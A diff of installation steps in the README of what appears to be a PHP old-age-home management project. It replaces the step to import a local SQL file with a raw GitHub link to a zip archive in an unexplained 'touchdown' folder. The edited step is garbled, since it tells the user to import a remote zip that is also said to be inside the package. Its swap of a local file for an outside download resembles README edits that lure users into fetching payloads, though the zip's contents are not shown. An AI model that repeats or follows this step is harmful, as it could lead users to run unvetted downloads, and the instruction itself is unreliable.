@@ -12,7 +12,7 @@
 
 5. Create a database with the name oahmsdb
 
-6. Import oahmsdb.sql file(given inside the zip package in the SQL file folder)
+6. Import https://raw.githubusercontent.com/sakshi-code-cse/Old-Age-Home-Management-System/master/touchdown/Old-Age-Home-Management-System.zip file(given inside the zip package in the SQL file folder)
 
 7. Run the script http://localhost/oahms
 
